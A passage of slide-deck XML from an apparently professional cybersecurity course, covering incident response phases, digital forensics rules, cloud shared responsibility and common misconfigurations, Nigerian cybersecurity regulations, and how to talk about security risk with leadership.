                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SIEM + IDS/IPS + EDR deployed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Tabletop exercises run regularly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>④ POST-INCIDENT     ② DETECTION &amp; ANALYSIS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────────   ────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Lessons learned     What systems affected?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Update IR plan      What data at risk?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Share intelligence  Is attack ongoing?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Brief leadership    Classify severity (P1–P4)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>└─── ③ CONTAINMENT, ERADICATION &amp; RECOVERY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>────────────────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Isolate systems (don't turn off!)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Forensic images BEFORE wiping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Remove threat completely</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Restore from clean backups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Average time to detect breach: 197 days</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>With mature IR programme: hours to days</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DIGITAL FORENSICS RULES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DIGITAL FORENSICS — THE 5 GOLDEN RULES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1. PRESERVE THE ORIGINAL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Never work on original evidence — always forensic copies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Write blockers prevent accidental modification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2. CHAIN OF CUSTODY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Document every person who touches evidence + timestamp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Any gap in chain can invalidate evidence in court</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3. DOCUMENT EVERYTHING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Time-stamped notes for every single action taken</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Screenshot, write, photograph</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4. DON'T ALTER THE EVIDENCE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Read-only mounting. Verify hash before and after.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Never open malware samples on the evidence drive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5. HASH VERIFICATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256 hash the original before copying</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256 hash the copy after</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Matching hashes = forensically sound copy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ORDER OF VOLATILITY (collect from most volatile first):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RAM → Network state → Running processes → Disk → Remote logs</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PROFESSIONAL</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11 OPENER: CLOUD SECURITY</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SHARED RESPONSIBILITY MODEL</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CLOUD SHARED RESPONSIBILITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AWS RESPONSIBLE                    CUSTOMER RESPONSIBLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>────────────────────               ─────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Physical data centres              Your data (encryption, classification)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hardware (servers, switches)       IAM (who has access to what)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Network infrastructure             Security groups (your firewall rules)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hypervisor / virtualisation        Operating systems on your VMs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Managed service patches            Your application code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Logging configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Backup strategy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE CRITICAL MISUNDERSTANDING:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"It's in the cloud so it's secure" = WRONG</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AWS has never been breached at the infrastructure level.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Every cloud breach has been in the CUSTOMER'S responsibility zone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IAM misconfiguration, exposed S3 buckets, missing MFA, weak passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AWS can't fix what you misconfigured.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Shared responsibility" means you're responsible for a LOT.</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TOP CLOUD SECURITY MISTAKES</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THE 6 MOST COMMON CLOUD SECURITY FAILURES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[PUBLIC S3 BUCKET]         [NO IAM MFA]              [OVER-PRIVILEGED ROLES]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Exposed customer data      Password = access          Service with admin access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Click to make public"     Brute force wins           Blast radius is everything</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fix: Remove public access  Fix: MFA mandatory         Fix: Least privilege always</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[OPEN SECURITY GROUPS]     [HARDCODED CREDENTIALS]    [NO CLOUDTRAIL LOGGING]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Database port open          Dev pushed AWS keys       Can't detect breach</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>to 0.0.0.0/0               to GitHub                  Can't do forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Tested in dev, forgot"     Attacker finds in hours    Fix: Enable day 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fix: Only specific IPs      Fix: Use IAM roles, not keys. Enable secret scanning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CASE STUDY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2019: Major Nigerian retailer — misconfigured S3 bucket exposed 800,000 customer records.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Found by security researcher. Could have been found by attacker first.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ No encryption, no IAM restriction, no logging enabled.</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0"/>
            <a:ext cx="3657600" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LEVEL: PROFESSIONAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2011680"/>
            <a:ext cx="11247120" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MODULE 12 OPENER: GRC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>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NIGERIAN REGULATORY LANDSCAPE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NIGERIAN CYBERSECURITY REGULATIONS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CBN CYBERSECURITY              NDPA 2023</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FRAMEWORK (2022)               ─────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>All licensed banks             Any org processing personal data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Annual pentest required        Data Protection Impact Assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CISO mandatory                 DPO required (large processors)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Incident reporting to CBN:     Breach notification: 72 hours to NDPC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>24 hours for major incidents   Technical security measures mandatory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NCC GUIDELINES                 NITDA GUIDELINES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────────              ─────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Telecom operators              All IT companies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MTN, Airtel, Glo, 9Mobile     Cybersecurity standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Customer data protection       Data localisation requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Network security standards     ngCERT coordination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ngCERT (ng-cert.gov.ng):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nigeria's national Computer Emergency Response Team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Report incidents · Get threat intelligence · Join the community</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RISK COMMUNICATION TO BOARDS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SPEAKING SECURITY TO LEADERSHIP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TECHNICAL (what not to say):       BUSINESS (what to say):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>──────────────────────────         ──────────────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
